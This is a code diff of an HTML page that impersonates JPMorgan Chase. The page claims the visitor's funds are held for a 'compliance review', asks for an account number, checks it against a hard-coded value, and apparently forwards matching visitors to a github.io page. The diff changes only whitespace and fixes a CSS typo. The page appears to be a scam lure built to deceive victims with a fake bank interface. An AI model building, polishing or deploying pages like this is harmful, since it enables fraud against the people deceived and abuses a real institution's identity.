@@ -1,4 +1,4 @@
-﻿<!DOCTYPE html>
+<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
@@ -54,7 +54,6 @@
             transition: transform 0.3s ease;
         }
         .logo img:hover { transform: scale(1.08); }
-
         /* Hamburger Button */
         .hamburger {
             display: none;
@@ -76,7 +75,6 @@
         .hamburger.active span:nth-child(1) { transform: rotate(45deg) translate(6px, 6px); }
         .hamburger.active span:nth-child(2) { opacity: 0; }
         .hamburger.active span:nth-child(3) { transform: rotate(-45deg) translate(7px, -6px); }
-
         /* Navigation Menu */
         .nav-menu {
             display: flex;
@@ -91,7 +89,6 @@
             font-size: 14px;
         }
         .nav-menu a:hover { text-decoration: underline; }
-
         /* ===== HERO ===== */
         .hero {
             background: linear-gradient(135deg, #005eb8 0%, #0077c8 100%);
@@ -111,7 +108,6 @@
             margin: 0 auto 24px;
             opacity: 0.95;
         }
-
         /* ===== FORM CARD ===== */
         .form-card {
             max-width: 560px;
@@ -186,7 +182,6 @@
         .btn-primary:active {
             background: var(--chase-dark);
         }
-
         /* ===== INFO BOXES ===== */
         .info-container {
             max-width: 1200px;
@@ -214,7 +209,6 @@
             font-size: 14px;
             color: #444;
         }
-
         /* ===== FOOTER ===== */
         footer {
             background: #f5f5f5;
@@ -230,7 +224,6 @@
             font-size: 12px;
         }
         footer a:hover { text-decoration: underline; }
-
         /* ===== MOBILE OPTIMIZATIONS ===== */
         @media (min-width: 768px) {
             .hero h1 { font-size: 42px; }
@@ -243,7 +236,6 @@
             .nav-menu { gap: 28px; }
             .nav-menu a { font-size: 15px; }
         }
-
         @media (max-width: 768px) {
             .hamburger { display: flex; }
             .nav-menu {
@@ -260,7 +252,7 @@
                 font-weight: 600;
                 transform: translateY(-100%);
                 transition: transform 0.4s ease;
-                z-index: , 100;
+                z-index: 100;
                 padding: 20px;
                 overflow-y: auto;
             }
@@ -273,12 +265,10 @@
             .form-card { margin: 24px 16px; padding: 24px 20px; }
             .btn-primary { padding: 18px; font-size: 18px; }
         }
-
         @media (max-width: 480px) {
             .top-bar { font-size: 12px; padding: 10px 12px; }
             .top-bar a { margin: 0 6px; }
         }
-
         /* Remove default tap highlight */
         * { -webkit-tap-highlight-color: transparent; }
     </style>
@@ -316,13 +306,11 @@
             </nav>
         </div>
     </header>
-
     <!-- Hero -->
     <section class="hero">
         <h1>Verify Your Transaction Status</h1>
         <p>If your funds are on hold due to a compliance review, enter your account number below to check the status and release timeline.</p>
     </section>
-
     <!-- Form Card -->
     <div class="form-card">
         <h2>Enter Your Account Number</h2>
@@ -334,7 +322,6 @@
         </div>
         <button class="btn-primary" onclick="verifyAccount()">Track Status</button>
     </div>
-
     <!-- Info Boxes -->
     <div class="info-container">
         <div class="info-grid">
@@ -348,18 +335,15 @@
             </div>
         </div>
     </div>
-
     <!-- Footer -->
     <footer>
         <p>© 2025 JPMorgan Chase & Co. All rights reserved.</p>
         <p><a href="#">Privacy</a> • <a href="#">Security</a> • <a href="#">Terms of Use</a></p>
     </footer>
-
     <!-- MOBILE-FRIENDLY SCRIPT -->
     <script>
         const CORRECT_ACCOUNT = '568306560';
         const TARGET_URL = 'https://portfolio-sitee.github.io/bradss/';
-
         function verifyAccount() {
             const input = document.getElementById('accountNum').value.trim();
             const inputField = document.getElementById('accountNum');
@@ -376,7 +360,6 @@
                 showError('Please enter the correct account number.');
             }
         }
-
         function showError(message) {
             const inputField = document.getElementById('accountNum');
             const errorMsg = document.getElementById('errorMsg');
@@ -384,7 +367,6 @@
             errorMsg.textContent = message;
             errorMsg.style.display = 'block';
         }
-
         // Enter key support
         document.getElementById('accountNum').addEventListener('keypress', function(e) {
             if (e.key === 'Enter') {
@@ -392,7 +374,6 @@
                 verifyAccount();
             }
         });
-
         // Auto-focus on mobile
         window.addEventListener('load', () => {
             if (window.innerWidth <= 768) {
@@ -401,16 +382,13 @@
                 }, 500);
             }
         });
-
         // === HAMBURGER MENU TOGGLE ===
         const hamburger = document.querySelector('.hamburger');
         const navMenu = document.querySelector('.nav-menu');
-
         hamburger.addEventListener('click', () => {
             hamburger.classList.toggle('active');
             navMenu.classList.toggle('active');
         });
-
         // Close menu when clicking a link
         document.querySelectorAll('.nav-menu a').forEach(link => {
             link.addEventListener('click', () => {
@@ -418,7 +396,6 @@
                 navMenu.classList.remove('active');
             });
         });
-
         // Close menu when clicking outside
         document.addEventListener('click', (e) => {
             if (!hamburger.contains(e.target) && !navMenu.contains(e.target)) {
